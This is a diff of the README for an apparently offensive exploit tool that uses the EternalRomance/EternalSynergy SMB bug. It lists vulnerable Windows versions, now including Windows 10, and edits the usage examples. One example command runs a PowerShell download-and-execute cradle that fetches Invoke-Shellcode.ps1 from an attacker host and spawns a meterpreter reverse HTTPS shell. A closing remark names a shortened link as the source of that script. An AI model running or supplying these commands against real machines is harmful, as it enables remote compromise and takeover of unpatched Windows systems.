@@ -38,17 +38,18 @@ This exploit exploits the same bug used by NSA's Eternalromance and Eternalsyner
 
 - Windows Server 2016 x64
 - Windows Server 2012 R2 x64
-- Windows 8.1 x64
 - Windows Server 2008 R2 SP1 x64
-- Windows 7 SP1 x64
+- Windows 10 x64
+- Windows 8.1 x64
 - Windows 8.1 x86
+- Windows 7 SP1 x64
 - Windows 7 SP1 x86
 
 ### Usage
 
 Example for finding a named pipe:
 
-`python find_named_pip.py 192.168.178.2 testuser Password123`
+`python find_named_pip.py 192.168.178.2 testuser !Password123`
 
 Usage of `eternalsynergy_romance.py`: 
 
@@ -60,6 +61,6 @@ Example for spawning an Empire agent:
 
 Example for spawning a meterpreter session:
 
-`python eternalsynergy_romance.py 192.168.178.2 netlogon "testuser" !Password123 "powershell -Exec ByPass -NoP -noexit \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.178.3/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.178.3 -Lport 8443 -Force \""`
+`python eternalsynergy_romance.py 192.168.178.2 netlogon testuser !Password123 "powershell -Exec ByPass -NoP -noexit \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.178.3/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.178.3 -Lport 8443 -Force \""`
 
 (I typically grab Invoke-Shellcode.ps1 from http://bit.ly/2cuWJTF, but that only works when the target has an unfiltered outbound connection.)
